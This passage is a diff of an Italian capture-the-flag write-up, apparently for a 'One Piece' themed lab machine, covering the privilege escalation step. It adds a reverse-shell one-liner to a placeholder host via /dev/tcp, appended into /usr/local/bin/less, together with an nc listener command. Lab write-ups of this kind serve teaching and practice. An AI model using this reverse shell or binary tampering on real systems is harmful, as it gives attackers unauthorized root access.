@@ -198,9 +198,13 @@ Now, he needs to find the One Piece._
 
 - sembra un altro vicolo cieco, per ottenere i privilegi necessari a diventare root bisogna modificare il file _less_
 - lanciando il comando _cat /etc/passwd_ possiamo notare che l'utente root ha la shell di default _bin/bash_
-- possiamo ora sfruttare il comando bash -i >& /dev/tcp/IP-ATT/4443 0>&1
+- possiamo ora sfruttare il comando _bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1_ inserendolo nel file _less_
+- echo 'bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1' >> /usr/local/bin/less
+- prima di lanciare il comando apriamo una connessione con _nc -lvnp PORT_
 
+![19](https://github.com/Manganaccio/Manganaccio/assets/137283468/fee70c71-ea5c-4ca1-add8-151a27b53a49)
 
+- ottenuti i privilegi di root bisogna cercare il file dove è contenuto il One Piece
     
   
      
